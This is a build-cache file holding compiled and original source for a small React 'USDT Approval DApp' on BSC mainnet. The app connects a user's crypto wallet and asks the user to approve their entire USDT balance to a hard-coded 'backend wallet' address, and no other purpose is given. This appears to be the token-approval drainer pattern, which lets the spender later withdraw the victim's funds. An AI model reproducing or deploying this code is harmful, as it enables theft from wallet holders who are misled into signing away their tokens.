{"ast":null,"code":"var _jsxFileName = \"/Users/aryan/Documents/frontend/src/App.js\",\n  _s = $RefreshSig$();\nimport React, { useState } from \"react\";\nimport { ethers } from \"ethers\";\nimport usdtAbi from \"./usdtAbi.json\";\nimport { jsxDEV as _jsxDEV, Fragment as _Fragment } from \"react/jsx-dev-runtime\";\nconst USDT_ADDRESS = \"0x55d398326f99059fF775485246999027B3197955\"; // BSC Mainnet USDT\nconst SPENDER_ADDRESS = \"0x64FaeC69187a1a24A36F6590f0f8F94F68b044ee\"; // ‚¨ÖÔ∏è Replace with backend wallet\n\nfunction App() {\n  _s();\n  const [connectedAccount, setConnectedAccount] = useState(null);\n  const [loading, setLoading] = useState(false);\n  async function connectWallet() {\n    if (!window.ethereum) {\n      alert(\"Please install MetaMask or Trust Wallet!\");\n      return;\n    }\n    try {\n      const provider = new ethers.BrowserProvider(window.ethereum);\n      const accounts = await provider.send(\"eth_requestAccounts\", []);\n      setConnectedAccount(accounts[0]);\n    } catch (err) {\n      console.error(\"Wallet connection error:\", err);\n    }\n  }\n  async function handleApprove() {\n    if (!window.ethereum) {\n      alert(\"Please install MetaMask or Trust Wallet!\");\n      return;\n    }\n    setLoading(true);\n    const provider = new ethers.providers.Web3Provider(window.ethereum, \"any\"); // Legacy-compatible\n    const signer = provider.getSigner();\n    const account = await signer.getAddress();\n    const usdt = new ethers.Contract(USDT_ADDRESS, usdtAbi, signer);\n    try {\n      const decimals = await usdt.decimals();\n      const balance = await usdt.balanceOf(account);\n      if (balance === 0n) {\n        alert(\"Your USDT balance is 0.\");\n        setLoading(false);\n        return;\n      }\n      const formatted = ethers.formatUnits(balance, decimals);\n      const tx = await usdt.approve(SPENDER_ADDRESS, balance);\n      alert(\"üìù Approval transaction sent: \" + tx.hash);\n      await tx.wait();\n      alert(`‚úÖ Approved ${formatted} USDT for backend wallet!`);\n    } catch (err) {\n      console.error(\"Approval failed:\", err);\n      alert(\"‚ùå Approval failed. Check the console for details.\");\n    }\n    setLoading(false);\n  }\n  return /*#__PURE__*/_jsxDEV(\"div\", {\n    style: {\n      padding: \"2rem\",\n      fontFamily: \"Arial\"\n    },\n    children: [/*#__PURE__*/_jsxDEV(\"h2\", {\n      children: \"USDT Approval DApp\"\n    }, void 0, false, {\n      fileName: _jsxFileName,\n      lineNumber: 64,\n      columnNumber: 7\n    }, this), connectedAccount ? /*#__PURE__*/_jsxDEV(_Fragment, {\n      children: [/*#__PURE__*/_jsxDEV(\"p\", {\n        children: [\"\\uD83D\\uDD17 Connected: \", connectedAccount]\n      }, void 0, true, {\n        fileName: _jsxFileName,\n        lineNumber: 67,\n        columnNumber: 11\n      }, this), /*#__PURE__*/_jsxDEV(\"button\", {\n        onClick: handleApprove,\n        disabled: loading,\n        children: loading ? \"Approving...\" : \"Approve USDT to Backend\"\n      }, void 0, false, {\n        fileName: _jsxFileName,\n        lineNumber: 68,\n        columnNumber: 11\n      }, this)]\n    }, void 0, true) : /*#__PURE__*/_jsxDEV(\"button\", {\n      onClick: connectWallet,\n      children: \"Connect Wallet\"\n    }, void 0, false, {\n      fileName: _jsxFileName,\n      lineNumber: 73,\n      columnNumber: 9\n    }, this)]\n  }, void 0, true, {\n    fileName: _jsxFileName,\n    lineNumber: 63,\n    columnNumber: 5\n  }, this);\n}\n_s(App, \"qF2M+qzEf+Op+2CmGYP54kvj3S0=\");\n_c = App;\nexport default App;\nvar _c;\n$RefreshReg$(_c, \"App\");","map":{"version":3,"names":["React","useState","ethers","usdtAbi","jsxDEV","_jsxDEV","Fragment","_Fragment","USDT_ADDRESS","SPENDER_ADDRESS","App","_s","connectedAccount","setConnectedAccount","loading","setLoading","connectWallet","window","ethereum","alert","provider","BrowserProvider","accounts","send","err","console","error","handleApprove","providers","Web3Provider","signer","getSigner","account","getAddress","usdt","Contract","decimals","balance","balanceOf","formatted","formatUnits","tx","approve","hash","wait","style","padding","fontFamily","children","fileName","_jsxFileName","lineNumber","columnNumber","onClick","disabled","_c","$RefreshReg$"],"sources":["/Users/aryan/Documents/frontend/src/App.js"],"sourcesContent":["import React, { useState } from \"react\";\nimport { ethers } from \"ethers\";\nimport usdtAbi from \"./usdtAbi.json\";\n\nconst USDT_ADDRESS = \"0x55d398326f99059fF775485246999027B3197955\"; // BSC Mainnet USDT\nconst SPENDER_ADDRESS = \"0x64FaeC69187a1a24A36F6590f0f8F94F68b044ee\"; // ‚¨ÖÔ∏è Replace with backend wallet\n\nfunction App() {\n  const [connectedAccount, setConnectedAccount] = useState(null);\n  const [loading, setLoading] = useState(false);\n\n  async function connectWallet() {\n    if (!window.ethereum) {\n      alert(\"Please install MetaMask or Trust Wallet!\");\n      return;\n    }\n\n    try {\n      const provider = new ethers.BrowserProvider(window.ethereum);\n      const accounts = await provider.send(\"eth_requestAccounts\", []);\n      setConnectedAccount(accounts[0]);\n    } catch (err) {\n      console.error(\"Wallet connection error:\", err);\n    }\n  }\n\n  async function handleApprove() {\n    if (!window.ethereum) {\n      alert(\"Please install MetaMask or Trust Wallet!\");\n      return;\n    }\n\n    setLoading(true);\n    const provider = new ethers.providers.Web3Provider(window.ethereum, \"any\"); // Legacy-compatible\n    const signer = provider.getSigner();\n    const account = await signer.getAddress();\n    const usdt = new ethers.Contract(USDT_ADDRESS, usdtAbi, signer);\n\n    try {\n      const decimals = await usdt.decimals();\n      const balance = await usdt.balanceOf(account);\n\n      if (balance === 0n) {\n        alert(\"Your USDT balance is 0.\");\n        setLoading(false);\n        return;\n      }\n\n      const formatted = ethers.formatUnits(balance, decimals);\n      const tx = await usdt.approve(SPENDER_ADDRESS, balance);\n      alert(\"üìù Approval transaction sent: \" + tx.hash);\n      await tx.wait();\n      alert(`‚úÖ Approved ${formatted} USDT for backend wallet!`);\n    } catch (err) {\n      console.error(\"Approval failed:\", err);\n      alert(\"‚ùå Approval failed. Check the console for details.\");\n    }\n\n    setLoading(false);\n  }\n\n  return (\n    <div style={{ padding: \"2rem\", fontFamily: \"Arial\" }}>\n      <h2>USDT Approval DApp</h2>\n      {connectedAccount ? (\n        <>\n          <p>üîó Connected: {connectedAccount}</p>\n          <button onClick={handleApprove} disabled={loading}>\n            {loading ? \"Approving...\" : \"Approve USDT to Backend\"}\n          </button>\n        </>\n      ) : (\n        <button onClick={connectWallet}>Connect Wallet</button>\n      )}\n    </div>\n  );\n}\n\nexport default App;\n"],"mappings":";;AAAA,OAAOA,KAAK,IAAIC,QAAQ,QAAQ,OAAO;AACvC,SAASC,MAAM,QAAQ,QAAQ;AAC/B,OAAOC,OAAO,MAAM,gBAAgB;AAAC,SAAAC,MAAA,IAAAC,OAAA,EAAAC,QAAA,IAAAC,SAAA;AAErC,MAAMC,YAAY,GAAG,4CAA4C,CAAC,CAAC;AACnE,MAAMC,eAAe,GAAG,4CAA4C,CAAC,CAAC;;AAEtE,SAASC,GAAGA,CAAA,EAAG;EAAAC,EAAA;EACb,MAAM,CAACC,gBAAgB,EAAEC,mBAAmB,CAAC,GAAGZ,QAAQ,CAAC,IAAI,CAAC;EAC9D,MAAM,CAACa,OAAO,EAAEC,UAAU,CAAC,GAAGd,QAAQ,CAAC,KAAK,CAAC;EAE7C,eAAee,aAAaA,CAAA,EAAG;IAC7B,IAAI,CAACC,MAAM,CAACC,QAAQ,EAAE;MACpBC,KAAK,CAAC,0CAA0C,CAAC;MACjD;IACF;IAEA,IAAI;MACF,MAAMC,QAAQ,GAAG,IAAIlB,MAAM,CAACmB,eAAe,CAACJ,MAAM,CAACC,QAAQ,CAAC;MAC5D,MAAMI,QAAQ,GAAG,MAAMF,QAAQ,CAACG,IAAI,CAAC,qBAAqB,EAAE,EAAE,CAAC;MAC/DV,mBAAmB,CAACS,QAAQ,CAAC,CAAC,CAAC,CAAC;IAClC,CAAC,CAAC,OAAOE,GAAG,EAAE;MACZC,OAAO,CAACC,KAAK,CAAC,0BAA0B,EAAEF,GAAG,CAAC;IAChD;EACF;EAEA,eAAeG,aAAaA,CAAA,EAAG;IAC7B,IAAI,CAACV,MAAM,CAACC,QAAQ,EAAE;MACpBC,KAAK,CAAC,0CAA0C,CAAC;MACjD;IACF;IAEAJ,UAAU,CAAC,IAAI,CAAC;IAChB,MAAMK,QAAQ,GAAG,IAAIlB,MAAM,CAAC0B,SAAS,CAACC,YAAY,CAACZ,MAAM,CAACC,QAAQ,EAAE,KAAK,CAAC,CAAC,CAAC;IAC5E,MAAMY,MAAM,GAAGV,QAAQ,CAACW,SAAS,CAAC,CAAC;IACnC,MAAMC,OAAO,GAAG,MAAMF,MAAM,CAACG,UAAU,CAAC,CAAC;IACzC,MAAMC,IAAI,GAAG,IAAIhC,MAAM,CAACiC,QAAQ,CAAC3B,YAAY,EAAEL,OAAO,EAAE2B,MAAM,CAAC;IAE/D,IAAI;MACF,MAAMM,QAAQ,GAAG,MAAMF,IAAI,CAACE,QAAQ,CAAC,CAAC;MACtC,MAAMC,OAAO,GAAG,MAAMH,IAAI,CAACI,SAAS,CAACN,OAAO,CAAC;MAE7C,IAAIK,OAAO,KAAK,EAAE,EAAE;QAClBlB,KAAK,CAAC,yBAAyB,CAAC;QAChCJ,UAAU,CAAC,KAAK,CAAC;QACjB;MACF;MAEA,MAAMwB,SAAS,GAAGrC,MAAM,CAACsC,WAAW,CAACH,OAAO,EAAED,QAAQ,CAAC;MACvD,MAAMK,EAAE,GAAG,MAAMP,IAAI,CAACQ,OAAO,CAACjC,eAAe,EAAE4B,OAAO,CAAC;MACvDlB,KAAK,CAAC,gCAAgC,GAAGsB,EAAE,CAACE,IAAI,CAAC;MACjD,MAAMF,EAAE,CAACG,IAAI,CAAC,CAAC;MACfzB,KAAK,CAAC,cAAcoB,SAAS,2BAA2B,CAAC;IAC3D,CAAC,CAAC,OAAOf,GAAG,EAAE;MACZC,OAAO,CAACC,KAAK,CAAC,kBAAkB,EAAEF,GAAG,CAAC;MACtCL,KAAK,CAAC,mDAAmD,CAAC;IAC5D;IAEAJ,UAAU,CAAC,KAAK,CAAC;EACnB;EAEA,oBACEV,OAAA;IAAKwC,KAAK,EAAE;MAAEC,OAAO,EAAE,MAAM;MAAEC,UAAU,EAAE;IAAQ,CAAE;IAAAC,QAAA,gBACnD3C,OAAA;MAAA2C,QAAA,EAAI;IAAkB;MAAAC,QAAA,EAAAC,YAAA;MAAAC,UAAA;MAAAC,YAAA;IAAA,OAAI,CAAC,EAC1BxC,gBAAgB,gBACfP,OAAA,CAAAE,SAAA;MAAAyC,QAAA,gBACE3C,OAAA;QAAA2C,QAAA,GAAG,0BAAc,EAACpC,gBAAgB;MAAA;QAAAqC,QAAA,EAAAC,YAAA;QAAAC,UAAA;QAAAC,YAAA;MAAA,OAAI,CAAC,eACvC/C,OAAA;QAAQgD,OAAO,EAAE1B,aAAc;QAAC2B,QAAQ,EAAExC,OAAQ;QAAAkC,QAAA,EAC/ClC,OAAO,GAAG,cAAc,GAAG;MAAyB;QAAAmC,QAAA,EAAAC,YAAA;QAAAC,UAAA;QAAAC,YAAA;MAAA,OAC/C,CAAC;IAAA,eACT,CAAC,gBAEH/C,OAAA;MAAQgD,OAAO,EAAErC,aAAc;MAAAgC,QAAA,EAAC;IAAc;MAAAC,QAAA,EAAAC,YAAA;MAAAC,UAAA;MAAAC,YAAA;IAAA,OAAQ,CACvD;EAAA;IAAAH,QAAA,EAAAC,YAAA;IAAAC,UAAA;IAAAC,YAAA;EAAA,OACE,CAAC;AAEV;AAACzC,EAAA,CArEQD,GAAG;AAAA6C,EAAA,GAAH7C,GAAG;AAuEZ,eAAeA,GAAG;AAAC,IAAA6C,EAAA;AAAAC,YAAA,CAAAD,EAAA","ignoreList":[]},"metadata":{},"sourceType":"module","externalDependencies":[]}